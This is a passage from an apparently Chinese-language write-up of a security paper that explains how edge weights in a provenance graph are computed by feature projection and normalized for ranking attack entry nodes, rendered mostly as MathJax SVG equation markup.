749Z"></path></g></g></g></svg></mjx-container></span>将上面等式的解表示为ω<sup>*</sup>=[ω<sub>S</sub><sup>*</sup>ω<sub>T</sub><sup>*</sup>ω<sub>C</sub><sup>*</sup>]<sup>T</sup>。</p><p>对于边e,其未被归一化的权重W<sub>eUN</sub>计算： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.8ex;" xmlns="http://www.w3.org/2000/svg" width="38.549ex" height="2.497ex" role="img" focusable="false" viewBox="0 -750 17038.7 1103.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="TeXAtom" transform="translate(977,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(466,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(1233,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2804.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(3860.3,0)"><g data-mml-node="mi"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g><g data-mml-node="mo" transform="translate(655,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(655,-247) scale(0.707)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g></g><g data-mml-node="msub" transform="translate(5021.4,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(645,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1034,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1500,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(7152.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(8152.6,0)"><g data-mml-node="mi"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g><g data-mml-node="mo" transform="translate(655,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(655,-247) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g><g data-mml-node="msub" transform="translate(9355.4,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(704,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1093,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1559,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(11528.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msubsup" transform="translate(12528.3,0)"><g data-mml-node="mi"><path data-c="1D714" d="M495 384Q495 406 514 424T555 443Q574 443 589 425T604 364Q604 334 592 278T555 155T483 38T377 -11Q297 -11 267 66Q266 68 260 61Q201 -11 125 -11Q15 -11 15 139Q15 230 56 325T123 434Q135 441 147 436Q160 429 160 418Q160 406 140 379T94 306T62 208Q61 202 61 187Q61 124 85 100T143 76Q201 76 245 129L253 137V156Q258 297 317 297Q348 297 348 261Q348 243 338 213T318 158L308 135Q309 133 310 129T318 115T334 97T358 83T393 76Q456 76 501 148T546 274Q546 305 533 325T508 357T495 384Z"></path></g><g data-mml-node="mo" transform="translate(655,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mi" transform="translate(655,-247) scale(0.707)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g></g><g data-mml-node="msub" transform="translate(13770.7,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(760,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1149,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1615,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(15760.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(16149.7,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><g data-mml-node="mo" transform="translate(16649.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>剩下的一个问题是等式（4）不能保证投影向量的方向，并且关键边的权重可能低于非关键边。为了解决这个问题，我们利用观察结果，在大多数情况下，关键边的数量明显少于非关键边的数量（从5.1节的攻击案例中可以看出）。具体来说，如果较小边的组（可能是关键边组）投影权重的平均值较小，那么我们否定投影向量的方向。如第5.4节所示，与采用平均特征的朴素方法(平均投影方法)相比，我们的特征投影方案保留了尽可能多的组区分性信息，并为条目节点排序带来了更好的性能。</p><p><strong>第3步：边缘权重归一化</strong>对于边e(u,v)，我们通过源节点u的所有出边的权重之和对其投影权重进行归一化：<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -3.222ex;" xmlns="http://www.w3.org/2000/svg" width="36.902ex" height="5.371ex" role="img" focusable="false" viewBox="0 -950 16310.5 2374.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="TeXAtom" transform="translate(977,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1634.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2690.1,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="TeXAtom" transform="translate(977,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(466,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(1233,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5216.8,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="munder" transform="translate(5883.5,0)"><g data-mml-node="mo" transform="translate(2385.5,0)"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(0,-1147.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 